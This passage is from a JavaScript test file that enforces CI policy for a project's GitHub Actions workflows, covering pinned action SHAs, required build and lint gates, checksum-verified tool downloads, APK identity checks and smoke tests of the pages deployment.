    'ossf/scorecard-action': 'fa7117db83c52d787ae5a89f350999701505d78e',
    'actions/stale': '4391f3da665fdf50b6810c1a66712fb9ba21aa93',
  });
});

test('every action used is on the allowlist, and every allowlisted action is used', async () => {
  const files = await readdir(join(projectRoot, WORKFLOW_DIR));
  const used = new Map();
  for (const name of files) {
    const text = await readFile(join(projectRoot, WORKFLOW_DIR, name), 'utf8');
    const { workflow } = parseWorkflow(text);
    for (const job of Object.values(workflow.jobs ?? {})) {
      for (const step of job.steps ?? []) {
        if (typeof step.uses !== 'string' || step.uses.startsWith('./')) continue;
        const [action, sha] = step.uses.split('@');
        const repo = action.split('/').slice(0, 2).join('/');
        assert.equal(sha, PINNED_ACTIONS[repo], `${name}: ${repo} uses the pinned commit`);
        used.set(repo, (used.get(repo) ?? 0) + 1);
      }
    }
  }
  assert.deepEqual([...used.keys()].sort(), Object.keys(PINNED_ACTIONS).sort(), 'no unused pin, no unpinned action');
});

test('every workflow runs on ubuntu-24.04', async () => {
  const files = await readdir(join(projectRoot, WORKFLOW_DIR));
  for (const name of files) {
    const { workflow } = parseWorkflow(await readFile(join(projectRoot, WORKFLOW_DIR, name), 'utf8'));
    for (const [job, definition] of Object.entries(workflow.jobs ?? {})) {
      assert.equal(definition['runs-on'], 'ubuntu-24.04', `${name}: ${job} runs on the pinned image`);
    }
  }
});

test('checks.yml runs every gate and proves the APK identity', async () => {
  const checks = await readFile(join(projectRoot, WORKFLOW_DIR, 'checks.yml'), 'utf8');
  for (const command of [
    'npm ci',
    'npm run build:brand -- --check',
    'npm run check:precache',
    'npm run privacy:check',
    'npm run test:unit',
    'node scripts/build-docs.mjs --check',
    'npm run docs:check',
    'npm run workflows:check',
    'git diff --exit-code',
    'test -z "$(git status --porcelain)"',
  ]) {
    assert.ok(checks.includes(command), `checks.yml runs ${command}`);
  }
  assert.match(checks, /node: \['22', '24', '26'\]/);
  assert.match(checks, /node scripts\/find-chrome\.mjs/);
  assert.match(checks, /CI: 'true'/);
  assert.match(checks, /ANDROID_PLATFORM: android-36/);
  assert.match(checks, /ANDROID_BUILD_TOOLS: '36\.0\.0'/);
  assert.match(checks, /bash scripts\/android-sdk\.sh/);
  assert.match(checks, /apksigner/);
  assert.match(checks, /brand\.json'\)\.appId/);
  assert.match(checks, /--version-code/);
  assert.match(checks, /versionCode='\$\{version_code\}'/);
  assert.match(checks, /run: node scripts\/ci-keystore\.mjs/);
  assert.doesNotMatch(checks, /ANDROID_ALLOW_TEST_KEY/);

  // The Android build must leave no tracked or untracked file, like the web job.
  const androids = checks.indexOf('  android:');
  const required = checks.indexOf('  required:');
  const block = checks.slice(androids, required);
  const build = block.indexOf('npm run build:android');
  const diff = block.indexOf('git diff --exit-code');
  const status = block.indexOf('test -z "$(git status --porcelain)"');
  assert.ok(build >= 0 && diff > build, 'the clean-tree proof follows the build');
  assert.ok(status > diff, 'the untracked-file proof follows the tracked-file proof');
});

test('actionlint is downloaded directly, checksum-verified and in the required aggregate', async () => {
  const actionlint = await readFile(join(projectRoot, WORKFLOW_DIR, 'actionlint.yml'), 'utf8');
  const script = await readFile(join(projectRoot, 'scripts', 'actionlint.sh'), 'utf8');
  assert.match(script, /^version=1\.7\.12$/m);
  assert.match(script, /actionlint_\$\{version\}_linux_amd64\.tar\.gz/);
  assert.match(script, /8aca8db96f1b94770f1b0d72b6dddcb1ebb8123cb3712530b08cc387b349a3d8/);
  assert.match(script, /sha256sum -c -/);
  assert.match(script, /tar -xzf/);
  assert.match(script, /RUNNER_TEMP:\?/);
  assert.match(actionlint, /run: bash scripts\/actionlint\.sh \.github\/workflows/);
  assert.doesNotMatch(actionlint, /actionlint_1\.7\.12/);
  assert.doesNotMatch(actionlint, /8aca8db96f1b94770f1b0d72b6dddcb1ebb8123cb3712530b08cc387b349a3d8/);
  assert.doesNotMatch(actionlint, /raven-actions\/actionlint/);

  // The trusted policy job runs the same owner against the candidate tree, and
  // `required` needs `policy`, so a lint error blocks the merge.
  const checksText = await readFile(join(projectRoot, WORKFLOW_DIR, 'checks.yml'), 'utf8');
  assert.match(checksText, /bash scripts\/actionlint\.sh "\$PR_TREE\/\.github\/workflows"/);
  const parsed = parseWorkflow(checksText).workflow;
  assert.ok(parsed.jobs.required.needs.includes('policy'), 'policy is in the aggregate');
  assert.ok(GATE_COMMANDS['checks.yml'].policy.includes('bash scripts/actionlint.sh "$PR_TREE/.github/workflows"'));
});

test('pages checks out main, then proves it is the commit Checks validated', async () => {
  const pages = await readFile(join(projectRoot, WORKFLOW_DIR, 'pages.yml'), 'utf8');
  assert.match(pages, /^concurrency:\n  group: pages\n  cancel-in-progress: false$/m);
  assert.match(pages, /workflow_run:/);
  assert.match(pages, /workflows: \[Checks\]/);
  assert.match(pages, /types: \[completed\]/);
  assert.match(pages, /branches: \[main\]/);
  assert.match(pages, /github\.event\.workflow_run\.conclusion == 'success'/);

  const refs = [...pages.matchAll(/^\s+ref:\s*(.+)$/gm)].map((match) => match[1].trim());
  assert.equal(refs.some((ref) => ref.includes('head_sha')), false);
  assert.equal(refs.filter((ref) => ref === 'main').length, 2);
  assert.equal(refs.filter((ref) => ref === 'refs/heads/main').length, 2);
  assert.equal((pages.match(/github\.event\.workflow_run\.head_repository\.full_name == github\.repository/g) ?? []).length, 2);
  assert.equal((pages.match(/expected="\$\{\{ github\.event\.workflow_run\.head_sha \}\}"/g) ?? []).length, 2);
  assert.equal((pages.match(/actual="\$\(git rev-parse HEAD\)"/g) ?? []).length, 2);
  assert.equal((pages.match(/if \[ "\$actual" != "\$expected" \]/g) ?? []).length, 2);

  const { workflow } = parseWorkflow(pages);
  assert.deepEqual(jobNames(workflow), ['build', 'deploy', 'smoke']);
  for (const name of ['build', 'smoke']) {
    const steps = workflow.jobs[name].steps;
    assert.ok(steps.some((step) => step.with?.ref === 'main'), `${name} checks out main`);
    assert.ok(steps.some((step) => String(step.run ?? '').includes('git rev-parse HEAD')), `${name} reads HEAD`);
  }
  const deploy = workflow.jobs.deploy;
  assert.equal(deploy.permissions.pages, 'write');
  assert.equal(deploy.permissions['id-token'], 'write');
  assert.equal(deploy.steps.length, 1, 'the deploy job runs one pinned action only');
  assert.match(pages, /npm run pages:build/);
  assert.match(pages, /node scripts\/build-pages\.mjs --check/);
  assert.match(pages, /node scripts\/smoke-pages\.mjs --base "\$BASE_URL" --cache-bust "\$RUN_ID"/);
  assert.match(pages, /manual dispatch[\s\S]{0,200}without a Checks run/i);
  assert.match(pages, /operator override/i);
});

test('the pages smoke test covers every precached file and notice exactly once', async () => {
  const paths = await smokePaths();
  const files = await collectFiles();
  const notices = DISTRIBUTION_FILES.map((file) => `/${file}`);
  assert.ok(files.length >= 64, `the runtime surface lists every file (${files.length})`);
  assert.deepEqual(paths, ['/', ...files.map((file) => `/${file}`), ...notices].sort());
  assert.equal(paths.filter((path) => path === '/').length, 1);
  assert.equal(paths.includes('/manifest.webmanifest'), true);
  for (const notice of notices) assert.ok(paths.includes(notice), `${notice} is probed`);
  assert.equal(manifestTypeProblem('application/manifest+json; charset=utf-8'), null);
  assert.match(manifestTypeProblem('text/plain'), /served as "text\/plain"/);
  assert.match(manifestTypeProblem(null), /no content type/);
  assert.equal(probeMethod('/'), 'HEAD');
  assert.equal(probeMethod('/assets/app.css'), 'HEAD');
  assert.equal(probeMethod('/manifest.webmanifest'), 'GET');
  for (const notice of notices) assert.equal(probeMethod(notice), 'GET');
});

test('a deployment that forgot a notice fails the smoke probe', async () => {
  const methods = [];
  const fetchImpl = async (url, options) => {
    methods.push(options.method);
    if (url.endsWith('/LICENSE')) return { status: 404, headers: { get: () => null } };
    return { status: 200, headers: { get: () => 'text/plain' } };
  };
  await assert.rejects(
    probe('https://example.test/drypoint/', '/LICENSE', { attempts: 2, delayMs: 0, fetchImpl, sleep: async () => {} }),
    /never answered 200/
  );
  assert.deepEqual(methods, ['GET', 'GET']);
});

test('codeql analyses the Android shell too', async () => {
  const codeql = await readFile(join(projectRoot, WORKFLOW_DIR, 'codeql.yml'), 'utf8');
  assert.match(codeql, /- language: java-kotlin/);
  assert.match(codeql, /- language: java-kotlin\n\s+build-mode: none/);
  assert.match(codeql, /build-mode: \$\{\{ matrix\.build-mode \}\}/);
  for (const language of ['javascript-typescript', 'actions']) {
    assert.match(codeql, new RegExp(`- language: ${language}\\n\\s+build-mode: none`));
  }
});

test('there is no duplicate Docs workflow', async () => {
  const names = await readdir(join(projectRoot, WORKFLOW_DIR));
  assert.equal(names.includes('docs.yml'), false);
});
